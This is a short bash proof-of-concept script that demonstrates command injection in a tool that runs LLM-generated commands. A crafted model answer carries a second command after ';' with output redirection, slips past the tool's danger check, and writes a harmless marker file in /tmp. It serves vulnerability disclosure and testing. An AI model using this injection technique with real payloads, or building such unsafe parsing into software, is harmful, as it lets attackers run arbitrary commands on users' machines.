#!/usr/bin/env bash
# Harmless local POC for Cleverest artifact bac4344. It creates one /tmp marker.
set -u
ARTIFACT="${1:-./tmp/cleverest}"
MARKER=/tmp/cleverest_cmd_injection_poc
rm -f "$MARKER"
cd "$ARTIFACT" || exit 2
# shellcheck source=/dev/null
source ./utils.sh
answer='Command: `target @@; printf VERIFIED > /tmp/cleverest_cmd_injection_poc`'
parsed="$(parse_llm_cmd "$answer")"
abort_if_cmd_danger "$parsed"  # returns: it fails to reject ; and redirection
constructed="$(get_cmd "/definitely/missing/build/$parsed" "SAFE_INPUT")"
printf 'parsed=%s\nconstructed=%s\n' "$parsed" "$constructed"
# run.sh uses script -c, which invokes the same shell grammar. bash -c avoids depending
# on platform-specific script(1) flags while proving the injection in that string.
bash -c "$constructed" >/dev/null 2>&1 || true
printf 'marker=%s\n' "$(cat "$MARKER" 2>/dev/null)"
test "$(cat "$MARKER" 2>/dev/null)" = VERIFIED
